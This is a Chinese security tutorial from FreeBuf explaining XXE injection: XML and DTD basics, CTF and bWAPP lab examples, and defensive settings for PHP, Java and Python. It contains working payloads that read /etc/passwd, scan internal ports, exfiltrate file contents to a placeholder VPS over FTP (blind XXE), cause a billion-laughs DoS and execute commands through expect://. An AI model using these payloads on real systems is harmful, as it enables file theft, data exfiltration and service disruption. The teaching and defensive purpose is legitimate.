***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 *** 本文作者：Hu3sky@D0g3，本文属FreeBuf原创奖励计划，未经许可禁止转载**

 **学习了XXE漏洞,自己来总结一下,如果有什么写的不到位，不够好的地方，还请师傅们指出。**

## 0x00 XXE漏洞

XXE漏洞全称XML External Entity
Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。

##  **0x01 XML**

既然说到XML，就先学习一波XML。

> \- XML被设计为传输和存储数据，其焦点是数据的内容。
>
> \- HTML被设计用来显示数据，其焦点是数据的外观。

XML把数据从HTML分离，XML是独立于软件和硬件的信息传输工具。

基本语法：

> \- 所有 XML 元素都须有关闭标签。
>
> \- XML 标签对大小写敏感。
>
> \- XML 必须正确地嵌套。
>
> \- XML 文档必须有根元素。
>
> \- XML 的属性值须加引号。

\- 实体引用，这里看个例子，如果你把字符 "<" 放在 XML，素中，会发生错误，这是因为解析器会把它当作新元素的开始。这样会产生XML错误：

`<message>hello <
world</message>`,为了避免错误。我们用实体引用`&amplt`来代替"<"字符。XML中，有5个预定义的实体引用。  
![1.png](https://image.3001.net/images/20180622/15295974357464.png!small)\-XML中的注释，在XML中编写注释的语法与 HTML 的语法很相似。

    
    
    <!-- -->

\- 在 XML 中，空格会被保留,多个空格不会被合并为一个。

    
    
    <bookstore> <!--根元素-->
    <book category="COOKING"> <!--bookstore的子元素，category为属性-->
    <title>Everyday Italian</title>      <!--book的子元素，lang为属性-->
    <author>Giada De Laurentiis</author>       <!--book的子元素-->
    <year>2005</year> <!--book的子元素-->
    <price>30.00</price> <!--book的子元素-->
    </book> <!--book的结束-->
    </bookstore> <!--bookstore的结束-->  
    

## 0x02 DTD

文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。带有DTD的XML文档实例

    
    
    <?xml version="1.0"?>
    <!DOCTYPE note [<!--定义此文档是 note 类型的文档-->
    <!ELEMENT note (to,from,heading,body)><!--定义note元素有四个元素-->
    <!ELEMENT to (#PCDATA)><!--定义to元素为”#PCDATA”类型-->
    <!ELEMENT from (#PCDATA)><!--定义from元素为”#PCDATA”类型-->
    <!ELEMENT head (#PCDATA)><!--定义head元素为”#PCDATA”类型-->
    <!ELEMENT body (#PCDATA)><!--定义body元素为”#PCDATA”类型-->
    ]>
    <note>
    <to>Y0u</to>
    <from>@re</from>
    <head>v3ry</head>
    <body>g00d!</body>
    </note>  
    

![2.png](https://image.3001.net/images/20180622/15295974594244.png!small)当使用外部DTD时，通过如下语法引入。

    
    
    <!DOCTYPE root-element SYSTEM "filename">

外部DTD实例

    
    
    <?xml version="1.0"?>
    <!DOCTYPE root-element SYSTEM "test.dtd">
    <note>
    <to>Y0u</to>
    <from>@re</from>
    <head>v3ry</head>
    <body>g00d!</body>
    </note>  
    

test.dtd：

    
    
    <!ELEMENT to (#PCDATA)><!--定义to元素为”#PCDATA”类型-->
    <!ELEMENT from (#PCDATA)><!--定义from元素为”#PCDATA”类型-->
    <!ELEMENT head (#PCDATA)><!--定义head元素为”#PCDATA”类型-->
    <!ELEMENT body (#PCDATA)><!--定义body元素为”#PCDATA”类型-->  
    

![3.png](https://image.3001.net/images/20180622/15295974717775.png!small)  

源码

![4.png](https://image.3001.net/images/20180622/15295974822450.png!small)  

\-PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。

![5.png](https://image.3001.net/images/20180622/1529597498511.png!small)不过，被解析的字符数据不应当包含任何&，<，或者>字符，需要用`&ampamp`
`&amplt` `&ampgt`实体来分别替换

\- CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。

### DTD元素

![6.png](https://image.3001.net/images/20180622/15295975099603.png!small)  

### DTD属性

属性声明使用以下语法

    
    
    <!ATTLIST 元素名称 属性名称 属性类型 默认值>

DTD实例

    
    
    <!ATTLIST payment Hu3sky CDATA "H">

XML实例

    
    
    <payment Hu3sky="H" />

以下是属性类型的选项

![7.png](https://image.3001.net/images/20180622/15295975192117.png!small)  

默认值参数可以使用下列值:

![8.png](https://image.3001.net/images/20180622/15295975369757.png!small)  

### **DTD-实体(重要)**

实体是用于定义引用普通文本或特殊字符的快捷方式的变量。

实体引用是对实体的引用。

实体可以在内部或外部进行声明

![9.png](https://image.3001.net/images/20180622/15295975464414.png!small)  

_内部实体_

    
    
    <!ENTITY 实体名称 "实体的值">

 _外部实体_

    
    
    <!ENTITY 实体名称 SYSTEM "URL">

 _参数实体_

    
    
    <!ENTITY %实体名称 "值">

or

    
    
    <!ENTITY %实体名称 SYSTEM "URL">

 **内部实体例子**

    
    
    <?xml version="1.0"?>
    <!DOCTYPE note[
    <!ELEMENT note (name)>
    <!ENTITY hack3r "Hu3sky">
    ]>
    <note>
    <name>&amphack3r</name>
    </note>
    

结果

![10.png](https://image.3001.net/images/20180622/15295975654516.png!small)
_参数实体+外部实体_

    
    
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE a [
      <!ENTITY % name SYSTEM "file:///etc/passwd">
      %name;
    ]>  
    

`%name`(参数实体)是在DTD中被引用的，而`&ampname`是在xml文档中被引用的。

XXE主要是利用了DTD引用外部实体导致的漏洞。

## 0x03 攻击思路

1\. 引用外部实体远程文件读取

2\. Blind XXE

3\. DoS

### 外部实体引用,有回显

 **读取任意文件**

 **例子一**

这里我用bWAPP平台上的一道XXE的题目来说明

题目是这样的，我们点击这个按钮然后抓包看看![11.png](https://image.3001.net/images/20180622/15295977151714.png!small)

![12.png](https://image.3001.net/images/20180622/15295979524821.png!small)可以看到xxe-1.php页面以POST方式向xxe-2.php页面传输了XML数据，既然是XML数据，我们就可以自己增加一个恶意外部实体然后再原本的XML数据中进行实体调用，来进行XXE攻击，如下：

![13.png](https://image.3001.net/images/20180622/15295976132603.png!small)可以看到，成功的读取了robots.txt中的内容，这里的hu3sky是我们定义的一个外部实体。

为了更好理解原理，我们来看一看xxe-2.php的源码。

主要代码在这。

![17.png](https://image.3001.net/images/20180622/1529597634926.png!small)可以看到这里直接用了`simplexml_load_string()`
，simplexml_load_string() 函数的作用是把XML
字符串载入对象中。函数获取xml内容，并没有做任何过滤，$login获取login标签里的内容，最后拼接到$message显示在屏幕上
![18.png](https://image.3001.net/images/20180622/15295976596718.png!small)

**例子二**

jarvisoj上的一道题目API调用

这道题的题目说明是 请设法获得目标机器/home/ctf/flag.txt中的flag值。

进入题目 <http://web.jarvisoj.com:9882/>
发现一个输入框，我们对其进行抓包![3.png](https://image.3001.net/images/20180622/15295980162679.png!small)发现了json数据，修改发现可以被解析

![4.png](https://image.3001.net/images/20180622/1529597684814.png!small)。一开始没有思路，后来看了wp，发现是要把json处改为xml。所以就知道了，这题是xxe。修改json处，构造一个xml表单进行xml注入，得到flag。![5.png](https://image.3001.net/images/20180622/1529597696340.png!small)

 **检测内网端口**

有回显时，直接发送payload：

    
    
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE XXE [
    <!ELEMENT name ANY >
    <!ENTITY XXE SYSTEM "http://127.0.0.1:80" >]>
    <root>
    <name>&ampXXE</name>
    </root>  
    

当我们检测80端口时，80端口开放，这时会返回页面报错信息(记得url编码。因为页面会解码一次)，如下：

![15.png](https://image.3001.net/images/20180622/15295977396671.png!small)
当我们检测3389端口，3389端口未开放，端口未开放时返回情况如下：

![16.png](https://image.3001.net/images/20180622/15295977524378.png!small)
**Blind XXE**

如果服务器没有回显，只能使用Blind XXE漏洞来构建一条外带数据(OOB)通道来读取数据。

所以，在没有回显的情况下如何来利用XXE

![14.png](https://image.3001.net/images/20180622/15295977644027.png!small)  

思路：

1\. 客户端发送payload 1给web服务器

2\. web服务器向vps获取恶意DTD，并执行文件读取payload2

3\. web服务器带着回显结果访问VPS上特定的FTP或者HTTP

4\. 通过VPS获得回显（nc监听端口）

本地客户端(payload 1 )

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [<!ENTITY % remote SYSTEM "http://vps/test.xml"> %remote;]>  
    

由于web端会解码，所以需要我们先html实体编码一次

payload 2 也就是test.xml的内容(VPS)

    
    
    <!ENTITY % payload SYSTEM "file:///etc/passwd">
    <!ENTITY % int "<!ENTITY % trick SYSTEM 'ftp://VPS:21/%payload;'>">
    %int;
    %trick;  
    

这个是先将SYSTEM的file协议读取到的内容赋值给参数实体%payload，第二步是一个实体嵌套，trick是远程访问ftp协议所携带的内容

### DOS

    
    
    <?xml version="1.0"?>
       <!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&amplol&amplol&amplol&amplol&amplol&amplol&amplol&amplol&amplol&amplol">
    <!ENTITY lol3 "&amplol2&amplol2&amplol2&amplol2&amplol2&amplol2&amplol2&amplol2&amplol2&amplol2">
    <!ENTITY lol4 "&amplol3&amplol3&amplol3&amplol3&amplol3&amplol3&amplol3&amplol3&amplol3&amplol3">
    <!ENTITY lol5 "&amplol4&amplol4&amplol4&amplol4&amplol4&amplol4&amplol4&amplol4&amplol4&amplol4">
    <!ENTITY lol6 "&amplol5&amplol5&amplol5&amplol5&amplol5&amplol5&amplol5&amplol5&amplol5&amplol5">
    <!ENTITY lol7 "&amplol6&amplol6&amplol6&amplol6&amplol6&amplol6&amplol6&amplol6&amplol6&amplol6">
    <!ENTITY lol8 "&amplol7&amplol7&amplol7&amplol7&amplol7&amplol7&amplol7&amplol7&amplol7&amplol7">
    <!ENTITY lol9 "&amplol8&amplol8&amplol8&amplol8&amplol8&amplol8&amplol8&amplol8&amplol8&amplol8">
    ]>
    <lolz>&amplol9</lolz>  
    

这个的原理就是递归引用,lol 实体具体还有 "lol" 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10
次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 "lol" 了，以此类推，lol9 实体含有 10^8 个 "lol"
字符串,最后再引用lol9。  

### 命令执行

php环境下，xml命令执行需要php装有expect扩展，但是该扩展默认没有安装，所以一般来说，比较难利用，这里就只给出代码了

    
    
    <?php 
    $xml = <<<EOF
    <?xml version = "1.0"?>
    <!DOCTYPE ANY [
      <!ENTITY f SYSTEM "except://ls">
    ]>
    <x>&ampf</x>
    EOF;
    $data = simplexml_load_string($xml);
    print_r($data);
    ?>  
    

## 0x04 防御XXE

### 使用开发语言提供的禁用外部实体的方法

PHP:

    
    
    libxml_disable_entity_loader(true);

JAVA:

    
    
    DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
    dbf.setExpandEntityReferences(false);  
    

Python:

    
    
    from lxml import etree
    xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))  
    

### #过滤用户提交的XML数据

过滤关键字：<\\!DOCTYPE和<\\!ENTITY，或者SYSTEM和PUBLIC。

### 不允许XML中含有自己定义的DTD

 *** 本文作者：Hu3sky@D0g3，本文属FreeBuf原创奖励计划，未经许可禁止转载**

